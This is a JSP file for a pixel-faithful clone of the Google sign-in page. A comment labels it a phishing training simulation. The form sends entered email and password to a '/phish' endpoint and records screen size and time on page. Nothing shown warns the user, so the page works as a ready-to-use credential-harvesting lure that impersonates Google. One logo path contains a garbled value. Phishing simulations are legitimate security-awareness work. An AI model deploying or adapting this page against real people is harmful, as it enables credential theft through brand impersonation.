<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%-- PHISHING TEMPLATE: Google Sign-In Clone --%>
<%-- This is a TRAINING SIMULATION. Not a real Google page. --%>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in – Google Accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            width: 450px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            box-shadow: 0 1px 2px rgba(0,0,0,.1);
        }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo svg { width: 75px; height: 24px; }
        h1 { font-family: 'Google Sans'; font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 8px; }
        .subtitle { font-size: 16px; color: #202124; text-align: center; margin-bottom: 24px; }
        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; font-size: 14px; color: #202124; margin-bottom: 4px; }
        .form-group input {
            width: 100%; padding: 13px 15px;
            border: 1px solid #dadce0; border-radius: 4px;
            font-size: 16px; outline: none;
            transition: border-color .2s;
        }
        .form-group input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,.2); }
        .forgot { font-size: 14px; color: #1a73e8; text-decoration: none; display: block; margin-bottom: 24px; }
        .forgot:hover { text-decoration: underline; }
        .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 24px; }
        .btn-create { font-size: 14px; color: #1a73e8; font-weight: 500; text-decoration: none; }
        .btn-next {
            background: #1a73e8; color: #fff;
            border: none; border-radius: 4px;
            padding: 10px 24px; font-size: 14px;
            font-weight: 500; cursor: pointer;
            font-family: 'Google Sans';
        }
        .btn-next:hover { background: #1765cc; }
        .divider { height: 1px; background: #e8eaed; margin: 24px 0; }
        .footer { text-align: center; font-size: 12px; color: #5f6368; }
        .footer a { color: #5f6368; text-decoration: none; margin: 0 8px; }
        .footer a:hover { text-decoration: underline; }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">
        <!-- Google logo SVG -->
        <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
            <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
            <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
            <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
            <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
            <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
            <path d="M35.29 41.41V32h31.donut" fill="none"/>
            <path d="M35.29 41.41V32H63c.28 1.46.42 3.22.42 5.1 0 6.34-1.74 14.19-7.35 19.81-5.45 5.71-12.44 8.74-21.77 8.74C16.96 65.65 0 49.2 0 31.66 0 14.12 16.96 0 34.3 0c9.58 0 16.42 3.78 21.55 8.65l-6.05 6.05c-3.69-3.44-8.66-6.13-15.5-6.13-12.67 0-22.59 10.2-22.59 23.09 0 12.89 9.92 23.09 22.59 23.09 8.23 0 12.91-3.28 15.91-6.29 2.44-2.44 4.05-5.92 4.68-10.67H35.29z" fill="#4285F4"/>
        </svg>
    </div>

    <h1>Sign in</h1>
    <p class="subtitle">to continue to Gmail</p>

    <form method="post" action="${pageContext.request.contextPath}/phish">
        <input type="hidden" name="screenSize" id="screenSize" value="">
        <input type="hidden" name="timeOnPage" id="timeOnPage" value="0">

        <div class="form-group">
            <input type="text" name="username" id="emailInput" placeholder="Email or phone" required autofocus>
        </div>
        <div class="form-group">
            <input type="password" name="password" placeholder="Enter your password" required>
        </div>
        <a href="#" class="forgot">Forgot password?</a>

        <div class="actions">
            <a href="#" class="btn-create">Create account</a>
            <button type="submit" class="btn-next">Next</button>
        </div>
    </form>

    <div class="divider"></div>
    <div class="footer">
        <a href="#">English (United States)</a>
        <div style="margin-top:12px">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>
</div>

<script>
    // Track time on page and screen size
    const startTime = Date.now();
    document.getElementById('screenSize').value = window.screen.width + 'x' + window.screen.height;
    document.querySelector('form').addEventListener('submit', function() {
        document.getElementById('timeOnPage').value = Math.floor((Date.now() - startTime) / 1000);
    });
</script>
</body>
</html>
